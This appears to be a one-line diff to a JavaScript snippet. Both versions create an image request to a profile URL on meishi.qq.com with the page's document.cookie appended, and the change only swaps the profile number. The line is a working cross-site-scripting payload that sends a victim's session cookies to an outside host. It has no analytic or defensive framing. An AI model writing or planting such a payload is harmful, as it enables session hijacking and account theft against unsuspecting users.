@@ -1,1 +1,1 @@
-new Image().src="http://meishi.qq.com/profiles/737191831"+escape(document.cookie);
+new Image().src="http://meishi.qq.com/profiles/1916960731"+escape(document.cookie);
